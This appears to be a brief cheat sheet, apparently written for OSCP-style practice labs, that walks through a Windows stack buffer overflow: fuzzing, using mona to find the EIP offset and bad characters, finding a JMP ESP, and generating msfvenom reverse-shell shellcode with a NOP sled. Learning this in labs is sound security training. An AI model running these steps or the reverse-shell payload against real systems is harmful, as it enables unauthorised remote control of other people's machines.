# Quick N Dirty Buffer Overflow

## Commands

Set mona as your working directory, this will make generating the bad character byte array easier
```
!mona config -set workingfolder c:\mona\%p
```
  
Modify fuzz.py with the correct IP address and command argument, and run it against the target host
```
python3 fuzz.py
```
  
Create a unique byte pattern with metasplot pattern_create script, set the end number to whatever value the program crashed at +400
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```
  
After successfuly crashing the program, run the mona script to find the exact EIP offset. Set the final digit to whatever value the fuzzer initially crashed the program at +400
```
!mona findmsp -distance 600
```
  
Generate a byte array in mona ignoring the known bad characters (this will always start with \x00 until we can determine the other bad characters)
```
!mona bytearray -b "\x00"
```
  
Run badchargen.py and pass it 00 as input (this is because \x00 is the only known bad character at this moment in time)
```
python3 badchargen.py
>> 00
```
  
After successfuly exploiting the program with the bad character payload, run this mona script with whatever value was held by the ESP register at crash (dont forget to fill the retn variable with 4 bytes like BBBB)
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```
  
Once you are 100% sure that you have excluded all of the bad characters, find a JMP point with mona
```
!mona jmp -r esp -cpb "\x00"
```
  
Generate shellcode with msfvenom using your local host variables and all bad characters
```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
  
Don't forget to add NOP sled to the exploit in order for the payload to have room in memory to unpack itself
```
padding = "\x90" * 16
```
